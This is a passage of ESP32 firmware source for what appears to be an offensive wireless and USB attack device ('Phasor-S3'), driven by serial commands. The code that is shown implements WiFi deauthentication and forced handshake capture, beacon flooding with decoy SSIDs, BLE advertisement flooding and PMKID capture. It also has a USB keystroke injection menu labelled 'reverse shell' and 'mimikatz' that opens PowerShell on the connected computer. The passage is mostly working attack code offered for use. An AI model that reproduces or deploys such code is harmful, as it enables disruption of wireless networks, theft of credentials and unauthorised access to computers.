      Serial.println("   DF <BSSID> <CH> <SEC>");
      Serial.print("  deauth> ");
      while (!Serial.available()) delay(5);
      String sub = Serial.readStringUntil('\n');
      sub.trim();

      char a[18] = {0}, b[18] = {0};
      uint8_t ah[6], bh[6];
      unsigned ch = 0, n = 0, sec = 0;

      if (sub.startsWith("DA ")) {
        if (sscanf(sub.c_str(), "DA %17s %u", a, &ch) == 2 && parseMac(a, ah))
          deauthBroadcast(ah, (uint8_t)ch, 8);
        else Serial.println("[-] bad DA");
      } else if (sub.startsWith("DS ")) {
        if (sscanf(sub.c_str(), "DS %17s %17s %u", a, b, &ch) == 3 &&
            parseMac(a, ah) && parseMac(b, bh))
          deauthTargeted(ah, bh, (uint8_t)ch, 12);
        else Serial.println("[-] bad DS");
      } else if (sub.startsWith("DB ")) {
        if (sscanf(sub.c_str(), "DB %17s %u %u", a, &ch, &n) >= 2 && parseMac(a, ah))
          deauthBroadcast(ah, (uint8_t)ch, n ? (int)n : 20);
        else Serial.println("[-] bad DB");
      } else if (sub.startsWith("DF ")) {
        if (sscanf(sub.c_str(), "DF %17s %u %u", a, &ch, &sec) >= 2 && parseMac(a, ah))
          forceHandshake(ah, (uint8_t)ch, sec ? (int)sec : 15);
        else Serial.println("[-] bad DF");
      } else {
        Serial.println("[-] unknown deauth cmd");
      }
      break;
    }

    case 'B':
    case 'b': {
      Serial.println();
      Serial.println("  BEACON: BA | BS | BL | BA <SSID> | BR | BC");
      Serial.print("  beacon> ");
      while (!Serial.available()) delay(5);
      String sub = Serial.readStringUntil('\n');
      sub.trim();

      if (sub == "BA") {
        if (!beaconCount) Serial.println("[-] load SSIDs first (BR)");
        else {
          wifi_config_t apcfg;
          memset(&apcfg, 0, sizeof(apcfg));
          strcpy((char*)apcfg.ap.ssid, "p");
          apcfg.ap.ssid_len = 1;
          apcfg.ap.channel = 1;
          apcfg.ap.authmode = WIFI_AUTH_OPEN;
          apcfg.ap.ssid_hidden = 1;
          apcfg.ap.max_connection = 1;
          apcfg.ap.beacon_interval = 60000;
          WiFi.mode(WIFI_AP);
          esp_wifi_set_config(WIFI_IF_AP, &apcfg);
          currentMode = MODE_BEACON_FLOOD;
          beaconTxIndex = 0;
          Serial.printf("[BEACON] flooding %d SSIDs\n", beaconCount);
        }
      } else if (sub == "BS") {
        currentMode = MODE_IDLE;
        WiFi.mode(WIFI_STA);
        Serial.println("[BEACON] stopped");
      } else if (sub == "BL") {
        for (int i = 0; i < beaconCount; i++)
          Serial.printf("  [%d] %s\n", i, beaconList[i].ssid);
      } else if (sub.startsWith("BA ")) {
        String ss = sub.substring(3);
        ss.trim();
        if (beaconCount < MAX_BEACON_SSIDS && ss.length() > 0 && ss.length() <= MAX_SSID_LEN) {
          ss.toCharArray(beaconList[beaconCount].ssid, MAX_SSID_LEN + 1);
          beaconList[beaconCount].active = true;
          beaconCount++;
          Serial.printf("[BEACON] added (%d)\n", beaconCount);
        }
      } else if (sub == "BR") {
        const char* defaults[] = {
          "Free Airport WiFi", "Starbucks WiFi", "ATT Wi-Fi", "Xfinity", "Guest Network",
          "Linksys", "NETGEAR", "TP-Link", "AndroidAP", "iPhone",
          "HomeWiFi", "OfficeNet", "Printer_HP", "Camera_01", "IoT_Hub",
          "Mesh_Node", "CoffeeShop", "Hotel_Guest", "Airport_Lounge", "Library_WiFi",
          "Campus_Open", "Transit_WiFi", "Mall_Free", "EV_Charger", "SmartTV",
          "Chromecast", "Direct-", "Setup", "config", "admin",
          "FBI_Van", "Test_AP_01", "Lab_WiFi", " pentest_lab", "OpenSesame",
          "NoAuth_Here", "Please_Hack_Me", "Honeypot", "Sinkhole", "DarkNet_Node"
        };
        beaconCount = 0;
        int nd = (int)(sizeof(defaults) / sizeof(defaults[0]));
        for (int i = 0; i < nd && beaconCount < MAX_BEACON_SSIDS; i++) {
          strncpy(beaconList[beaconCount].ssid, defaults[i], MAX_SSID_LEN);
          beaconList[beaconCount].ssid[MAX_SSID_LEN] = 0;
          beaconList[beaconCount].active = true;
          beaconCount++;
        }
        Serial.printf("[BEACON] loaded %d\n", beaconCount);
      } else if (sub == "BC") {
        beaconCount = 0;
        Serial.println("[BEACON] cleared");
      } else {
        Serial.println("[-] bad beacon cmd");
      }
      break;
    }

    case 'F':
    case 'f': {
      Serial.println();
      Serial.println("  BLE: F1 <MAC> <N> | F2 <N> | FS");
      Serial.print("  ble> ");
      while (!Serial.available()) delay(5);
      String sub = Serial.readStringUntil('\n');
      sub.trim();
      char mac[18] = {0};
      int n = 0;
      uint8_t m[6];
      if (sub.startsWith("F1 ")) {
        if (sscanf(sub.c_str(), "F1 %17s %d", mac, &n) >= 1 && parseMac(mac, m)) {
          if (n < 10) n = 80;
          bleFloodStart(m, n);
        } else Serial.println("[-] bad F1");
      } else if (sub.startsWith("F2 ")) {
        if (sscanf(sub.c_str(), "F2 %d", &n) == 1) {
          if (n < 5) n = 30;
          bleMassFlood(n);
        } else Serial.println("[-] bad F2");
      } else if (sub == "FS") {
        attackRunning = false;
        if (pBLEAdvertising) pBLEAdvertising->stop();
        currentMode = MODE_IDLE;
        restoreBleScan();
        Serial.println("[BLE] stopped");
      } else {
        Serial.println("[-] bad ble cmd");
      }
      break;
    }

    case 'P':
    case 'p': {
      Serial.println();
      Serial.println("  PM <BSSID> <CH>");
      Serial.println("  PS <BSSID> <SSID> <CH>");
      Serial.print("  pmkid> ");
      while (!Serial.available()) delay(5);
      String sub = Serial.readStringUntil('\n');
      sub.trim();
      char a[18] = {0}, s[33] = {0};
      unsigned ch = 0;
      uint8_t m[6];
      if (sub.startsWith("PM ")) {
        if (sscanf(sub.c_str(), "PM %17s %u", a, &ch) == 2 && parseMac(a, m))
          pmkidCapture(m, "x", (uint8_t)ch);
        else Serial.println("[-] bad PM");
      } else if (sub.startsWith("PS ")) {
        if (sscanf(sub.c_str(), "PS %17s %32s %u", a, s, &ch) == 3 && parseMac(a, m))
          pmkidCapture(m, s, (uint8_t)ch);
        else Serial.println("[-] bad PS");
      } else {
        Serial.println("[-] bad pmkid cmd");
      }
      break;
    }

    case 'K':
    case 'k': {
#if !HAS_USB_HID
      Serial.println("[-] Enable Tools > USB Mode = USB-OTG (TinyUSB)");
#else
      Serial.println("  K1 reverse shell  |  K2 mimikatz  |  K3 text");
      Serial.print("  hid> ");
      while (!Serial.available()) delay(5);
      String sub = Serial.readStringUntil('\n');
      sub.trim();
      Keyboard.begin();
      delay(1500);
      if (sub == "K1") {
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.write('r');
        Keyboard.releaseAll();
        delay(400);
        Keyboard.print("powershell");
        Keyboard.write(KEY_RETURN);
      } else if (sub == "K2") {
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.write('r');
        Keyboard.releaseAll();
        delay(400);
        Keyboard.print("powershell");
        Keyboard.write(KEY_RETURN);
      } else if (sub == "K3") {
        Serial.println("type text, empty line ends:");
        String text;
        while (true) {
          while (!Serial.available()) delay(5);
          String line = Serial.readStringUntil('\n');
          line.trim();
          if (!line.length()) break;
          text += line + "\n";
        }
        Keyboard.print(text.c_str());
      }
      Keyboard.end();
      Serial.println("[HID] done");
#endif
      break;
    }

    default:
      break;
  }

  printMenu();
}

// Mode handlers
void handleMonitorMode() {
  if (millis() - lastHop > MONITOR_HOP_MS) {
    currentChannel = (currentChannel % 13) + 1;
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    lastHop = millis();
  }
  if (Serial.available()) {
    String s = Serial.readStringUntil('\n');
    s.trim();
    if (s == "5") {
      currentMode = MODE_IDLE;
      esp_wifi_set_promiscuous(false);
      Serial.println("[*] Monitor OFF");
      printMenu();
    } else if (s.length()) {
      cmdHandler(s);
    }
  }
}

void handleContinuousMode() {
  static uint32_t last = 0;
  if (millis() - last > 8000) {
    scanFull();
    last = millis();
  }
  if (Serial.available()) {
    String s = Serial.readStringUntil('\n');
    s.trim();
    if (s == "4") {
      currentMode = MODE_IDLE;
      Serial.println("[*] Continuous OFF");
      printMenu();
    }
  }
}

void handleBeaconFlood() {
  if (!beaconCount) {
    currentMode = MODE_IDLE;
    return;
  }
  if (millis() - lastBeaconTx >= 80) {
    uint8_t ch = (uint8_t)((millis() / 1000) % 13 + 1);
    for (int i = 0; i < 3; i++) {
      int idx = (beaconTxIndex + i) % beaconCount;
      beaconInject(beaconList[idx].ssid, ch, nullptr);
    }
    beaconTxIndex = (beaconTxIndex + 3) % beaconCount;
    lastBeaconTx = millis();
  }
  if (Serial.available()) {
    String s = Serial.readStringUntil('\n');
    s.trim();
    if (s.equalsIgnoreCase("BS") || s.equalsIgnoreCase("B")) {
      currentMode = MODE_IDLE;
      WiFi.mode(WIFI_STA);
      Serial.println("[BEACON] stopped");
      printMenu();
    }
  }
}

void handleBLEFlood() {
  if (!attackRunning) {
    currentMode = MODE_IDLE;
    restoreBleScan();
    return;
  }
  uint32_t runMs = (uint32_t)bleFloodQuota * BLE_FLOOD_INTERVAL_MS;
  if (runMs < 1000) runMs = 2000;
  if (millis() - attackStartTime > runMs) {
    attackRunning = false;
    if (pBLEAdvertising) pBLEAdvertising->stop();
    currentMode = MODE_IDLE;
    restoreBleScan();
    Serial.println("[BLE-FLOOD] complete");
    printMenu();
  }
  if (Serial.available()) {
    String s = Serial.readStringUntil('\n');
    s.trim();
    if (s.equalsIgnoreCase("FS") || s.equalsIgnoreCase("X")) {
      attackRunning = false;
      if (pBLEAdvertising) pBLEAdvertising->stop();
      currentMode = MODE_IDLE;
      restoreBleScan();
      Serial.println("[BLE-FLOOD] stopped");
      printMenu();
    }
  }
}

// Setup / Loop
void setup() {
  Serial.begin(115200);
  uint32_t t0 = millis();
  while (!Serial && millis() - t0 < 4000) delay(10);

  printBanner();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true, true);
  delay(100);

  BLEDevice::init("Phasor-S3");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new ScanCallback());
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);

  esp_wifi_set_promiscuous_rx_cb(&promiscuousCb);

  Serial.printf("[*] boot OK | HS slots %d | STA slots %d\n",
                MAX_HANDSHAKE_CACHE, MAX_STATION_CACHE);
#if HAS_USB_HID
  Serial.println("[*] USB-HID enabled");
#else
  Serial.println("[*] USB-HID stubs (enable TinyUSB for HID)");
#endif
  printMenu();
}

void loop() {
  switch (currentMode) {
    case MODE_MONITOR:
      handleMonitorMode();
      return;
    case MODE_CONTINUOUS_SCAN:
      handleContinuousMode();
      return;
    case MODE_BEACON_FLOOD:
      handleBeaconFlood();
      return;
    case MODE_BLE_FLOOD:
      handleBLEFlood();
      return;
    default:
      break;
  }

  if (!Serial.available()) {
    delay(5);
    return;
  }
  String cmd = Serial.readStringUntil('\n');
  cmd.trim();
  cmdHandler(cmd);
}
